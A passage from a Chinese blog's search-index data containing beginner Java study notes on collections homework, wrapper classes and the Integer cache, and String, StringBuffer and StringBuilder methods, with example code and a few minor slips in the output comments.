\"...\";\n        } else {\n            return  title;\n        }\n    }\n\n}\n\n\nclass News{\n    private String title;\n    private String content;\n\n    public News(String title) {\n        this.title = title;\n    }\n\n    public String getTitle() {\n        return title;\n    }\n\n    public void setTitle(String title) {\n        this.title = title;\n    }\n\n    public String getContent() {\n        return content;\n    }\n\n    public void setContent(String content) {\n        this.content = content;\n    }\n\n    @Override\n    public String toString() {\n        return \"News{\" +\n                \"title='\" + title + '\\'' +\n                '}';\n    }\n}\n```\n\n### 2.编程题Homework02.java\n\n使用 ArrayList 完成对对象 Car{name, price} 的各种操作\n\n- 1.add:添加单个元素\n- 2.remove:删除指定元素\n- 3.contains:查找元素是否存在\n- 4.size:获取元素个数\n- 5.isEmpty:判断是否为空\n- 6.clear:清空\n- 7.addAlI:添加多个元素\n- 8.containsAll:查找多个元素是否都存在\n- 9.使用增强for和迭代器来遍历所有的car ,需要重写Car的toString方法\n- 10.removeAll: 删除多个元素\n\n```java\npackage com.jwt.map_;\n\nimport java.util.ArrayList;\nimport java.util.Iterator;\npublic class Homework02 {\n    public static void main(String[] args) {\n        Car car = new Car(\"宝马\",400000);\n        Car car2 = new Car(\"宾利\", 5000000);\n\n        ArrayList<Car> arraylist = new ArrayList<>();\n        //1.add:添加单个元素\n        arraylist.add(car);\n        arraylist.add(car2);\n        System.out.println(\"arraylist = \" + arraylist);\n        //2.remove:删除指定元素\n        arraylist.remove(car2);\n        System.out.println(\"arraylist = \" + arraylist);\n        //3.contains:查找元素是否存在\n        System.out.println(arraylist.contains(car));\n        //4.size:获取元素个数\n        System.out.println(arraylist.size());\n        //5.isEmpty:判断是否为空\n        System.out.println(arraylist.isEmpty());\n        //6.clear:清空\n        arraylist.clear();\n        System.out.println(\"arraylist = \" + arraylist);\n        //7.addAlI:添加多个元素\n        ArrayList<Car> arraylist2 = new ArrayList<>();\n        arraylist2.add(car);\n        arraylist2.add(car2);\n        arraylist.addAll(arraylist2);\n        System.out.println(\"arraylist = \" + arraylist);\n        //8.containsAll:查找多个元素是否都存在\n        System.out.println(arraylist.containsAll(arraylist2));\n\n        //9.使用增强for和迭代器来遍历所有的car ,需要重写Car的toString方法\n        //增强for\n        for (Object o :arraylist) {\n            System.out.println(\"o = \" + o);\n        }\n        //迭代器\n        Iterator<Car> iterator = arraylist.iterator();\n        while (iterator.hasNext()) {\n            Car next = iterator.next();\n            System.out.println(\"next = \" + next);\n        }\n\n        //10.removeAll: 删除多个元素\n        arraylist.removeAll(arraylist2);\n        System.out.println(\"arraylist = \" + arraylist);\n    }\n\n}\n\nclass Car{\n    private String name;\n    private double price;\n\n    public Car(String name, double price) {\n        this.name = name;\n        this.price = price;\n    }\n\n    @Override\n    public String toString() {\n        return \"Car{\" +\n                \"name='\" + name + '\\'' +\n                \", price=\" + price +\n                '}';\n    }\n}\n```\n\n### 3.编程题Homework03.java\n\n按要求完成下列任务\n1)使用 HashMap 类实例化一个 Map 类型的对象 m,键(String) 和值(int) 分别用于存储员工的姓名和工资，存入数据如下: jack-650元; tom-1200元; smith-2900元;\n2)将jack的工资更改为2600元\n3)为所有员工工资加薪100元\n4)遍历集合中所有的员工\n5)遍历售合中所有的工资\n\n```java\npackage com.jwt.map_;\n\nimport java.util.*;\npublic class Homework03 {\n    public static void main(String[] args) {\n        Map map = new HashMap();\n        map.put(\"jack\",650);\n        map.put(\"tom\",1200);\n        map.put(\"smith\",2900);\n        //将jack的工资更改为2600元\n        map.put(\"jack\",2600);\n        System.out.println(\"map = \" + map);\n        //为所有员工工资加薪100元\n        Set set = map.keySet();\n        for (Object key :set) {\n            map.put(key,(Integer)map.get(key)+100);\n        }\n        System.out.println(\"map = \" + map);\n        //遍历集合中所有的员工\n        Set set1 = map.entrySet();\n        Iterator iterator = set1.iterator();\n        while (iterator.hasNext()) {\n            Object next =  iterator.next();\n            Map.Entry m = (Map.Entry) next;\n            System.out.println(m.getKey() + \"-\" + m.getValue());\n        }\n        //遍历售合中所有的工资\n        Collection values = map.values();\n        for (Object o :values) {\n            System.out.println(\"工资 = \" + o);\n        }\n    }\n}\n```\n\n### 4.简答题\n\n试分析 HashSet 和 TreeSet 分别如何实现去重的？\n\n- (1) HashSet 的去重机制: hashCode() + equals() ，底层先通过存入对象，进行运算得到一个 hash 值，通过 hash 值得到对应的索引，如果发现 table索引所在的位置，没有数据，就直接存放如果有数据，就进行 equals 比较[遍历比较]， 如果比较后，不相同，就加入，否则就不加入。\n- (2) TreeSet的去重机制：如果你传入了一个 Comparator 匿名对象，就使用实现的 compare 去重，如果方法返回 0，就认为是相同的元素/数据，就不添加；如果你没有传入一个 Comparator 匿名对象，则以你添加的对象实现的 Compareable 接口的 compareTo 去重。\n\n### 5.代码分析题\n\n下面代码运行会不会抛出异常，并从源码层面说明原因[考察读源码+接口编程+动态绑定]\n\n```java\nTreeSet treeSet = new TreeSet();\ntreeSet.add(new Person());\n```\n\n会报转换异常(ClassCastException)，Person 类要实现 Compareable 才行\n\n因为 TreeSet() 构造器没有传入 Comparator 接口的匿名内部类，所以在底层会执行 ComparabLe<? super K> k = (Comparable<? super K>) key; 即把 Perosn 转成 Comparable 类型，所以 Person 类要实现 Compareable 才不报错\n\n```java\nclass Person implements Comparable{\n  \n    ....\n      \n    @Override\n    public int compareTo(Object o) {\n      return 0；\n    }\n}\n```\n\n### 6.代码分析题\n\n已知: Person 类按照 id 和 name 重写了 hashCode 和 equals 方法，问下面代码输出什么?\n\n```java\nHashSet set = new HashSet();//ok\nPerson p1 = new Person(1001,\"AA\");//ok\nPerson p2 = new Person(1002,\"BB\");//ok\nset.add(p1);//ok\nset.add(p2);//ok\np1.name = \"CC\";\nset.remove(p1);//此处计算“1001-CC”的hash值，p1还存在“1001-AA”的hash值的位置，所以删除不成功\nSystem.out.println(set); //2个对象\nset.add(new Person(1001,\"CC\"));//计算“1001-CC”的hash，此处为空，可以添加\nSystem.out.println(set); //3个对象 \nset.add(new Person(1001,\" AA\"));//计算“1001-AA”的hash，此处不为空，进行equals比较，p1已经变成“1001-CC”，不相同，会挂在p1后面，添加成功\nSystem.out.println(set) //4个对象  \n```\n\n##  参考\n\n- [送分题，ArrayList 的扩容机制了解吗？ - 云+社区 - 腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1810587?from=article.detail.1874923)\n- [ArrayList源码解析(基于Java8)扩容删除 - 云+社区 - 腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1124770?from=article.detail.1874923)\n- [ArrayList源码+扩容机制分析 - 云+社区 - 腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1874923)\n- [ArrayList源码分析（基于JDK8）_Fighter168的博客-CSDN博客](https://blog.csdn.net/fighterandknight/article/details/61240861)\n- [ArrayList 从源码角度剖析底层原理](https://hulunhao.com/2021/07/20/0defba1aec05404f1fa7b3f3956027b3/)\n- [LinkedList 源码解析 - 掘金 (juejin.cn)](https://juejin.cn/post/7029148988473344014)\n- [LinkedList 源码解析](https://juejin.cn/post/7010260543504138254)\n- [IDEA调试debug时，stepinto 进不去方法和数据显示不完整的解决方法](https://blog.csdn.net/qq_40839718/article/details/123464047)\n- [在Intellij IDEA中使用Debug - bojiangzhou - 博客园 (cnblogs.com)](https://www.cnblogs.com/chiangchou/p/idea-debug.html)\n\n## ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["集合"],"categories":["JavaSE"]},{"title":"Java-常用类","url":"/posts/33453.html","content":"\n## 前言\n\n哈喽！大家好，我是小简。今天开始学习《Java-常用类》，此系列是我做的一个 “Java 从 0 到 1 ” 实验，给自己一年左右时间，按照我自己总结的 [Java-学习路线](https://jwt1399.top/posts/29829.html)，从 0 开始学 Java 知识，并不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 🚩时间安排：预计4天更新完\n- [x] 🎯开始时间：03-16\n- [x] 🎉结束时间：03-18\n- [x] 🍀总结：用时 3 天 \n\n## 包装类\n\n### 简介\n\nJava 中的包装类提供了将**基本数据类型转换为对象**，以及将**对象转换为基本数据类型**的机制。\n\n`java.lang`包的八个类在 Java 中称为包装类。八个包装类的列表如下：\n\n| 基本类型 | 包装类    |\n| -------- | --------- |\n| byte     | Byte      |\n| short    | Short     |\n| int      | Integer   |\n| float    | Float     |\n| double   | Double    |\n| long     | Long      |\n| char     | Character |\n| boolean  | Boolean   |\n\n### **为什么需要包装类？**\n\n包装类是一个对象，基本类型不是。当需要一个适合像面向对象编程的类型时就需要包装类。当希望数据类型变得简单时就使用基本数据类型。基本数据类型不能为`null`，但包装类可以为`null`。包装类可用于实现多态性。\n\n### 装箱和拆箱\n\n- 装箱：基本类型 -> 包装类型\n- 拆箱：包装类型 ->  基本类型\n\n1) jdk5 前需要**手动装箱和拆箱**\n2) jdk5 及其以后采用**自动装箱和拆箱**\n3) 自动装箱底层调用的是 valueOf 方法，比如 Integer.valueOf()\n\n```java\npackage com.jwt.wrapper;\n\n//演示int <--> Integer 的装箱和拆箱\npublic class Integer01 {\n  public static void main(String[] args) {\n    int n1 = 100;\n    //手动装箱\n    Integer integer = new Integer(n1);//方式1\n    Integer integer1 = Integer.valueOf(n1);//方式2\n    //手动拆箱\n    int i = integer.intValue();\n\n    int n2 = 200;\n    //自动装箱\n    Integer integer2 = n2; //底层使用的是Integer.valueOf(n2)\n    //自动拆箱\n    int n3 = integer2; //底层仍然使用的是intValue()方法\n\t}\n}\n```\n\n### 包装类型和 String 转换\n\n```java\npackage com.jwt.wrapper;\n\npublic class WrapperVSString {\n    public static void main(String[] args) {\n        //包装类(Integer)->String\n        Integer i = 100;//自动装箱\n        //方式1\n        String str1 = i + \"\";\n        //方式2\n        String str2 = i.toString();\n        //方式3\n        String str3 = String.valueOf(i);\n\n\n        //String -> 包装类(Integer)\n        String str4 = \"12345\";\n        Integer i2 = Integer.parseInt(str4);//使用到自动装箱\n        Integer i3 = new Integer(str4);//构造器\n        System.out.println(\"ok~~\");\n    }\n}\n```\n\n### Integer类和Character类的常用方法\n\n```java\npackage com.jwt.wrapper;\n\npublic class WrapperMethod {\n    public static void main(String[] args) {\n        System.out.println(Integer.MIN_VALUE); //返回最小值\n        System.out.println(Integer.MAX_VALUE);//返回最大值\n        System.out.println(Character.isDigit('a'));//判断是不是数字\n        System.out.println(Character.isLetter('a'));//判断是不是字母\n        System.out.println(Character.isUpperCase('a'));//判断是不是大写\n        System.out.println(Character.isLowerCase('a'));//判断是不是小写\n        System.out.println(Character.isWhitespace('a'));//判断是不是空格\n        System.out.println(Character.toUpperCase('a'));//转成大写\n        System.out.println(Character.toLowerCase('A'));//转成小写\n    }\n}\n```\n\n### 面试题\n\n#### 题1\n\n```java\nInteger i = new Integer(1);\nInteger j = new Integer(1);\nSystem.out.println(i == j); \n\n//false\n//判断的是两个对象是否相等，都是new的不想等\n```\n\n#### 题2\n\n```java\nInteger m = 1; //底层Integer.valueOf(1); -> 阅读源码\nInteger n = 1;//底层Integer.valueOf(1);\nSystem.out.println(m == n); \n\n/*  valueOf源码\n\npublic static Integer valueOf(int i) {\n\t\tif (i >= IntegerCache.low && i <= IntegerCache.high)\n\t\t\t\treturn IntegerCache.cache[i + (-IntegerCache.low)];\n    return new Integer(i);\n}\n\n*/\n\n//1. 如果 i 在IntegerCache.low(-128)~IntegerCache.high(127),就直接从cache数组返回\n//2. 如果不在-128~127,就直接new Integer(i)\n\n\n\n//true\n//1在范围 -128 ~ 127 就是直接返回\n```\n\n#### 题3\n\n```java\nInteger x = 128;//底层Integer.valueOf(128);\nInteger y = 128;//底层Integer.valueOf(128);\nSystem.out.println(x == y);\n\n//false\n//128不在范围 -128 ~ 127 就直接new Integer(i)，所以两个对象不同\n```\n\n#### 题4\n\n```java\n//示例一\nInteger i1 = new Integer(127);\nInteger i2 = new Integer(127);\nSystem.out.println(i1 == i2);//F\n//示例二\nInteger i3 = new Integer(128);\nInteger i4 = new Integer(128);\nSystem.out.println(i3 == i4);//F\n//示例三\nInteger i5 = 127;//底层Integer.valueOf(127)\nInteger i6 = 127;//-128~127\nSystem.out.println(i5 == i6); //T\n//示例四\nInteger i7 = 128;\nInteger i8 = 128;\nSystem.out.println(i7 == i8);//F\n//示例五\nInteger i9 = 127; //Integer.valueOf(127)\nInteger i10 = new Integer(127);\nSystem.out.println(i9 == i10);//F\n//示例六\nInteger i11=127;\nint i12=127;\n//如果有基本数据类型，判断的是值是否相同\nSystem.out.println(i11==i12); //T\n//示例七\nInteger i13=128;\nint i14=128;\nSystem.out.println(i13==i14);//T\n```\n\n#### 总结\n\n- Integer integer = 123; //自动装箱底层使用的是Integer.valueOf(123)\n\n```java\n//valueOf源码\n\npublic static Integer valueOf(int i) {\n\t\tif (i >= IntegerCache.low && i <= IntegerCache.high)\n\t\t\t\treturn IntegerCache.cache[i + (-IntegerCache.low)];\n    return new Integer(i);\n}\n\n\n//1. 如果 i 在IntegerCache.low(-128)~IntegerCache.high(127),就直接从cache数组返回\n//2. 如果不在 -128~127,就直接 new Integer(i)\n```\n\n包装类比较大小的时候有很多坑，比如： == 比较引用，Integer 类型只有在 -128 到 127 的范围内，才会持有同一个引用，因此需要使用 `equals()` 代替 `==` 来比较值是否相等。equals 方法会先比较类型是否一致，不一致直接 false。\n\n## String类\n\n### 简介\n\n1) String对象用于保存字符串，也就是一组字符序列\n2) 字符串常量对象是用双引号括起的字符序列。例如: \"你好”、 \"12.97\"、 \"boy\"等\n3) 字符串的字符使用Unicode字符编码，一个字符(不区分字母还是汉字)占两个字节。\n4) String类较常用构造器：\n  - String s1 = new String();\n  - String s2 = new String(String original);\n  - String s3 = new String(char[] a);\n  - String s4 = new String(char[] a,int startIndex,int count)\n\n5. String 类实现了接口 Serializable 和 Comparable\n\n   - 接口 Serializable [String 可以串行化:可以在网络传输]\n\n   - 接口 Comparable [String 对象可以比较大小]\n\n6. String 是 final 类，不能被其他的类继承\n\n7. String 类有属性 private final char value[]; 用于存放字符串内容\n\n8.  char value[] 是一个 final 类型， 不可以修改(不可以修改地址)：即 value 不能指向新的地址，但是单个字符内容是可以变化\n\n   ```java\n   String name = \"jack\";\n   name = \"tom\";//可以\n   //String name=\"jack”，是name指向一个char[] value,里面存的是“jack”；\n   //接着name=\"tom\",是另外声明了一个char[] value，value里面内容是”tom“,然后将name这个引用指向内容为 ”tom“这个value。\n   \n   \n   final char[] value = {'a','b','c'};\n   value[0] = 'H';//可以\n   char[] value2 = {'t','o','m'};\n   //value = v2; 不可以修改value地址\n   ```\n\n### 创建String对象\n\n- 方式一：直接赋值 String s = \"jianjian\";\n\n- 方式二：调用构造器 String s = new String(\"jianjain\"); \n\n### **两种创建String对象的区别**\n\n- 方式一：\n  - 先从常量池查看是否有 \"jianjain\" 数据空间，\n  - 如果常量池有，直接指向；如果常量池没有则创建，然后指向。\n  - s 最终指向的是常量池的空间地址\n- 方式二:\n  - 先在堆中创建空间，里面维护了 value 属性，指向常量池的 \"jianjian\" 空间。\n  - 如果常量池有，直接通过 value 指向，如果常量池没有则创建，然后指向。\n  - S 最终指向的是堆中的空间地址。\n\n![](https://img.jwt1399.top/img/image-20220315220819135.png)\n\n**练习**\n\n```java\nString a = \"abc\";\nString b = \"abc\";\nSystem.out.println(a.equals(b));//T\nSystem.out.println(a==b);//T\n\nString a = new String(\"abc\");\nString b = new String(\"abc\");\nSystem.out.println(a.equals(b));//T\nSystem.out.println(a == b);//F\n                      \nString a = \"abc\";//a指向常量池的\"abc\"\nString b = new String(\"abc\");//b指向堆中对象\nSystem.out.println(a.equals(b));//T\nSystem.out.println(a==b);//F\nSystem.out.println(a==b.intern());//T\nSystem.out.println(b==b.intern());//F\n//intern()方法返回的是最终常量池的地址(对象)\n                                      \nString s1 = \"jianjian\"; //指向常量池的\"jianjian\"\nString s2 = \"java\"; //指向常量池的\"java\"\nString s4 = \"java\";//指向常量池的\"java\"\nString s3 = new String(\"java\")//指向堆中对象\nSystem.out.println(s2==s3);//F\nSystem.out.println(s2==s4); //T\nSystem.out.println(s2.equals(s3));//T\nSystem.out.println(s1==s2); //F\n                                      \nPerson p1 = new Person();\np1.name = \"jianjian\";\nPerson p2 = new Person();\np2.name = \"jianjian\";\nSystem.out.println(p1.name.equals(p2.name)):// True\nSystem.out.println(p1.name == p2.name); //T\nSystem.out.println(p1.name == \"jianjian\"); //T\n\nString s1 = new String(\"bcde\");\nString s2 = new String(\"bcde\");\nSystem.out.println(s1 == s2); //F\n```\n\n### String 类的常见方法\n\n- ①equals //区分大小写，判断内容是否相等\n- ②equalsIgnoreCase //忽略大小写的判断内容是否相等\n- ③length //获取字符的个数，字符串的长度\n- ④indexOf //获取字符在字符串中第1次出现的索引,索引从0开始，如果找不到，返回-1\n- ⑤lastIndexOf //获取字符在字符串中最后1次出现的索引,索引从开始,如找不到，返回-1\n- ⑥substring //截取指定范围的子串\n- ⑦trim //去前后空格\n- ⑧charAt //获取某索引处的字符，注意不能使用Str[index]这种方式\n\n```java\npackage com.string_;\n\npublic class StringMethod01 {\n    public static void main(String[] args) {\n        //1. 比较内容是否相同，区分大小写\n        String str1 = \"hello\";\n        String str2 = \"Hello\";\n        System.out.println(str1.equals(str2));\n        // 2.equalsIgnoreCase 忽略大小写的判断内容是否相等\n        String username = \"johN\";\n        if (\"john\".equalsIgnoreCase(username)) {\n            System.out.println(\"Success!\");\n        } else {\n            System.out.println(\"Failure!\");\n        }\n        // 3.length 获取字符的个数，字符串的长度\n        System.out.println(\"jian\".length());\n        // 4.indexOf 获取字符在字符串对象中第一次出现的索引，索引从0 开始，如果找不到，返回-1\n        String s1 = \"wer@terwe@g\";\n        int index = s1.indexOf('@');\n        System.out.println(index);// 3\n        // 5.lastIndexOf 获取字符在字符串中最后一次出现的索引，索引从0 开始，如果找不到，返回-1\n        s1 = \"wer@terwe@g@\";\n        index = s1.lastIndexOf('@');\n        System.out.println(index);//11\n        // 6.substring 截取指定范围的子串\n        String name = \"hello,张三\";\n        //下面name.substring(6) 从索引6开始截取后面所有的内容\n        System.out.println(name.substring(6));//截取后面的字符\n        //name.substring(2,5)表示从索引2开始截取，截取到索引5-1=4 位置\n        System.out.println(name.substring(2,5));//llo\n      \t//7.trim 去前后空格\n        s1 = \" jianjian \";\n        System.out.println(s1.trim());//\"jianjian\"\n        System.out.println(s1);//\" jianjian \"\n        //8.charAt 获取某索引处的字符，注意不能使用Str[index]这种方式\n        s1 = \"jianjian\";\n        System.out.println(s1.charAt(0));\n    }\n}\n```\n\n- ①toUpperCase //转换成大写\n- ②toLowerCase //转换成小写\n- ③concat //拼接字符串\n- ④replace //替换字符串中的字符\n- ⑤split //分割字符串，对于某些分割字符，我们需要转义比如/、\\\\等\n- ⑥compareTo //比较两个字符串的大小\n- ⑦toCharArray //转换成字符数组\n- ⑧format //格式字符串，\n  - %s字符串 \n  - %c字符\n  - %d整型\n  - %.2f浮点型\n\n```java\npackage com.string_;\n\npublic class StringMethod02 {\n    public static void main(String[] args) {\n        // 1.toUpperCase 转换成大写\n        String s = \"heLLo\";\n        System.out.println(s.toUpperCase());//HELLO\n        // 2.toLowerCase 转换成小写\n        System.out.println(s.toLowerCase());//hello\n        // 3.concat 拼接字符串\n        String s1 = \"宝玉\";\n        s1 = s1.concat(\"林黛玉\").concat(\"薛宝钗\");\n        System.out.println(s1);//宝玉林黛玉薛宝钗\n        // 4.replace 替换字符串中的字符\n        s1 = \"宝玉林黛玉林黛玉林黛玉\";\n        //s1.replace() 方法执行后，返回的结果才是替换过的，注意对s1 没有任何影响\n        String s11 = s1.replace(\"宝玉\", \"林黛玉\");\n        System.out.println(s1);//宝玉林黛玉林黛玉林黛玉\n        System.out.println(s11);//林黛玉林黛玉林黛玉林黛玉\n        // 5.split 分割字符串, 对于某些分割字符，我们需要转义比如| \\\\等\n        String poem = \"锄禾日当午,汗滴禾下土,谁知盘中餐,粒粒皆辛苦\";\n        // 以, 为标准对poem 进行分割, 返回一个数组\n        // 在对字符串进行分割时，如果有特殊字符，需要加入转义符\\\n        String[] split = poem.split(\",\");\n        System.out.println(\"==分割后内容===\");\n        for (int i = 0; i < split.length; i++) {\n            System.out.println(split[i]);\n        }\n\n        poem = \"E:\\\\aaa\\\\bbb\";\n        split = poem.split(\"\\\\\\\\\");\n        System.out.println(\"==分割后内容===\");\n        for (int i = 0; i < split.length; i++) {\n            System.out.println(split[i]);\n        }\n        // 6.toCharArray 转换成字符数组\n        s = \"happy\";\n        char[] chs = s.toCharArray();\n        for (int i = 0; i < chs.length; i++) {\n            System.out.println(chs[i]);\n        }\n        // 7.compareTo 比较两个字符串的大小\n        // 如果前者大，则返回正数，后者大，则返回负数，如果相等，返回0\n        // (1) 如果长度相同，并且每个字符也相同，就返回0\n        String a1 = \"abc\";\n        String b1 = \"abc\";\n        System.out.println(a1.compareTo(b1)); // 返回值是0\n        // (2) 如果长度相同，字符不同，返回str1 - str2\n        String a2 = \"acc\";// len = 3\n        String b2 = \"aac\";// len = 5\n        System.out.println(a2.compareTo(b2)); // 返回值是'c' - 'a' = 2 的值\n        // (3) 如果长度不相同且前部分相同，就返回str1.len - str2.len\n        String a3 = \"abc\";// len = 3\n        String b3 = \"abcde\";// len = 5\n        System.out.println(a3.compareTo(b3)); // 返回值是3-5=2\n        //(4) 如果长度不相同且前部分不相同，就返回str1 - str2\n        String a4 = \"bac\";// len = 3\n        String b4 = \"abcde\";// len = 5\n        System.out.println(a4.compareTo(b4)); // 返回值是 'b'-'a'=1\n        // 8.format 格式字符串\n        String name = \"john\";\n        int age = 10;\n        double score = 56.857;\n        char gender = '男';\n        //将所有的信息都拼接在一个字符串.\n        String info = \"我的姓名是\" + name + \"，年龄是\" + age + \"，成绩是\" + score + \"，性别是\" + gender + \"，希望大家喜欢我！ \";\n        System.out.println(info);\n        String formatStr = \"我的姓名是%s ，年龄是%d，成绩是%.2f，性别是%c，希望大家喜欢我！\";\n        String info2 = String.format(formatStr, name, age, score, gender);\n        System.out.println(\"info2=\" + info2);\n    }\n}\n```\n\n## StringBuffer类\n\n### 简介\n\nStringBuffer 代表可变的字符序列，可以对字符串内容进行增删。StringBuffer是一个容器。\n\n**创建StringBuffer对象**\n\n```java\nStringBuffer stringBuffer = new StringBuffer(\"hello\");\n```\n\n- 1. StringBuffer 的直接父类是 AbstractStringBuilder\n\n- 2. StringBuffer 实现了Serializable, 即 StringBuffer 的对象可以串行化\n\n- 3. 在父类中 AbstractStringBuilder 有属性 char[] value，不是final，该 value 数组存放字符串内容，数组存放在堆中的\n\n- 4. StringBuffer 是一个 final 类，不能被继承\n\n- 5. 因为 StringBuffer 字符内容是存储在 char[] value, 所有在变化(增加/删除)，不用每次都更换地址(即不是每次创建新对象)， 所以效率高于 String\n\n### String & StringBuffer\n\n- String 保存的是字符串常量，里面的值不能更改，每次 String 类的更新实际上就是新建对象更改地址，效率较低\n\n  - private final char value[];//放在常量池\n\n- StringBuffer 保存的是字符串变量，里面的值可以更改，每次 StringBuffer 的更新实际上可以更新内容，不用每次更新地址，效率较高\n\n  - char[] value; // 放在堆中\n\n  - ```java\n    //StringBuffer构造器源码\n    //构造时默认创建长度为16的 char[] 数组\n    public StringBuffer(String str) {\n    super(str.length() + 16);\n    append(str);\n    }\n    ```\n\n### String和StringBuffer转换\n\n```java\npackage com.jwt.stringbuffer_;\n\npublic class StringAndStringBuffer {\n    public static void main(String[] args) {\n        //String——>StringBuffer\n        String str = \"hello tom\";\n        //方式1 使用构造器\n        //注意： 返回的才是StringBuffer 对象，对str 本身没有影响\n        StringBuffer stringBuffer1 = new StringBuffer(str);\n        //方式2 使用的是append 方法\n        StringBuffer stringBuffer2 = new StringBuffer();\n        stringBuffer2 = stringBuffer2.append(str);\n        \n        //StringBuffer ->String\n        StringBuffer stringBuffer3 = new StringBuffer(\"测试\");\n        //方式1 使用StringBuffer 提供的toString 方法\n        String s = stringBuffer3.toString();\n        //方式2: 使用构造器来搞定\n        String s1 = new String(stringBuffer3);\n    }\n}\n```\n\n### StringBuffer类常见方法\n\n```java\npackage com.jwt.stringbuffer_;\n\npublic class StringBufferMethod {\n    public static void main(String[] args) {\n        \n        StringBuffer s = new StringBuffer(\"hello\");\n        //增\n        s.append(',');// \"hello,\"\n        s.append(\"张三丰\");//\"hello,张三丰\"\n        s.append(\"赵敏\").append(100).append(true).append(10.5);//\"hello,张三丰赵敏100true10.5\"\n        System.out.println(s);//\"hello,张三丰赵敏100true10.5\"\n        //删\n        s.delete(11, 14);//删除[11, 14)的字符\n        System.out.println(s);//\"hello,张三丰赵敏true10.5\"\n        //改\n        s.replace(9, 11, \"周芷若\"); //使用周芷若替换索引[9,11)的字符\n        System.out.println(s);//\"hello,张三丰周芷若true10.5\"\n        //查找\n        int indexOf = s.indexOf(\"张三丰\");//查找指定的子串在字符串第一次出现的索引，如果找不到返回-1\n        System.out.println(indexOf);//6\n        //插\n        s.insert(9, \"赵敏\");//在索引为9 的位置插入\"赵敏\"\n        System.out.println(s);//\"hello,张三丰赵敏周芷若true10.5\"\n        //长度\n        System.out.println(s.length());//22\n        System.out.println(s);\n    }\n}\n```\n\n## StringBuilder 类\n\n### 简介\n\nStringBuilder 是一个可变的字符串类，StringBuilder内容是可变的\n\n- 此类提供一个与 StringBuffer 兼容的API，但不保证同步(StringBuilder不是线程安全)。该类被设计用作 StringBuffer 的一个简易替换，用在字符串缓冲区被单个线程使用的时候。如果可能，建议优先采用该类因为在大多数实现中，它比 StringBuffer 要快。\n- 在 StringBuilder 上的主要操作是 append 和 insert 方法，可重载这些方法，以接受任意类型的数据。\n\n### **创建Stringbuilder对象**\n\n```java\nStringBuilder strB = new StringBuilder(\"hello\");\n```\n\n**1、append(String str)/append(Char c)：字符串连接**\n\n```java\nSystem.out.println(\"StringBuilder:\"+strB.append(\"ch\").append(\"111\").append('c'));\n//return \"StringBuilder:ch111c\"\n```\n\n**2、toString()：把Stringbuilder转换为String输出**\n\n```java\nSystem.out.println(\"String:\"+strB.toString());\n//return \"String:ch111c\"\n```\n\n**3、appendcodePoint(int cp)：追加一个代码点，并将其转换为一个或两个代码单元并返回this**\n\n```java\nSystem.out.println(\"StringBuilder.appendCodePoint:\"+strB.appendCodePoint(2));\n//return \"StringBuilder.appendCodePoint:ch111c\"\n```\n\n**4、setCharAt(int i, char c)：将第 i 个代码单元设置为 c（可以理解为替换）**\n\n```java\nstrB.setCharAt(2, 'd');\nSystem.out.println(\"StringBuilder.setCharAt:\" + strB);\n//return \"StringBuilder.setCharAt:chd11c\"\n```\n\n**5、insert(int offset, String str)/insert(int offset, Char c)：在指定位置之前插入字符(串)**\n\n```java\nSystem.out.println(\"StringBuilder.insertString:\"+ strB.insert(2, \"LS\"));\n//return \"StringBuilder.insertString:chLSd11c\"\nSystem.out.println(\"StringBuilder.insertChar:\"+ strB.insert(2, 'L'));\n//return \"StringBuilder.insertChar:chLLSd11c\"\n```\n\n**6、delete(int startIndex,int endIndex)：删除起始位置（含）到结尾位置（不含）之间的字符串**\n\n```java\nSystem.out.println(\"StringBuilder.delete:\"+ strB.delete(2, 4));\n//return \"StringBuilder.delete:chSd11c\"\n```\n\n## String类比较\n\n1) String：不可变字符序列，效率低，但是复用率高。\n2) StringBuffer：可变字符序列、效率较高(增删)、线程安全\n3) StringBuilder：可变字符序列、效率最高、线程不安全\n\nString使用注意说明：\n\n- ```java\n  string s = \"a\"; //创建了一个字符串\n  s += \"b\"; \n  //实际上原来的\"a\"字符串对象已经丢弃了,现在又产生了一个字符串 s + \"b\" (也就是\"ab\")。\n  \n  //如果多次执行这些改变串内容的操作，会导致大量副本宇符串对象存留在内存中，降低效率。\n  //如果这样的操作放到循环中，会极大影响程序的性能\n  //结论:如果我们对String做大量修改，不要使用String\n  ```\n\n**String、StringBuffer、StringBuilder 效率**\n\n-  StringBuilder > StringBuffer > String\n\n```java\npackage com.jwt.stringbuffer_;\n\npublic class StringVsStringBufferVsStringBuilder {\n    public static void main(String[] args) {\n\n        long startTime = 0L;\n        long endTime = 0L;\n        StringBuffer buffer = new StringBuffer(\"\");\n        startTime = System.currentTimeMillis();\n        for (int i = 0; i < 80000; i++) {//StringBuffer 拼接80000 次\n            buffer.append(String.valueOf(i));\n        }\n        endTime = System.currentTimeMillis();\n        System.out.println(\"StringBuffer 的执行时间：\" + (endTime - startTime) + \"ms\");\n\n\n        StringBuilder builder = new StringBuilder(\"\");\n        startTime = System.currentTimeMillis();\n        for (int i = 0; i < 80000; i++) {//StringBuilder 拼接80000 次\n            builder.append(String.valueOf(i));\n        }\n        endTime = System.currentTimeMillis();\n        System.out.println(\"StringBuilder 的执行时间：\" + (endTime - startTime) + \"ms\");\n\n\n        String text = \"\";\n        startTime = System.currentTimeMillis();\n        for (int i = 0; i < 80000; i++) {//String 拼接80000\n            text = text + i;\n        }\n        endTime = System.currentTimeMillis();\n        System.out.println(\"String 的执行时间：\" + (endTime - startTime) + \"ms\");\n    }\n}\n\n/*\nStringBuffer 的执行时间：7ms\nStringBuilder 的执行时间：3ms\nString 的执行时间：1385ms\n*/\n```\n\n**String、StringBuffer、StringBuilder 的选择**\n\n- 1.如果字符串存在大量的修改操作，一般使用 StringBuffer 或 